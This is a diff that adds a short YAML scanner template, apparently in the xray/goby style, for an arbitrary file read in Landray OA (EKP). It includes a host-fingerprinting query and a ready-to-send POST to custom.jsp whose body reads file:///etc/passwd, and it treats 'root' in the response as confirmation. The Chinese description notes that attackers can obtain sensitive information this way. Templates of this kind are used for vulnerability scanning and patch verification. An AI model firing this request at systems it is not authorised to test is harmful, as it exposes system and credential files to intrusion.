@@ -1,0 +1,23 @@
+name: landray-OA-Arbitrary-file-read
+manual: true
+query: app="landray-OA"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /sys/ui/extend/varkind/custom.jsp
+      headers:
+        Accept-Encoding: gzip
+        Content-Length: "42"
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15
+          (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+      body: var={"body":{"file":"file:///etc/passwd"}}
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: https://github.com/adminwaf/goby_exp/
+  links:
+  - https://github.com/adminwaf/goby_exp/
+  description: 深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息。
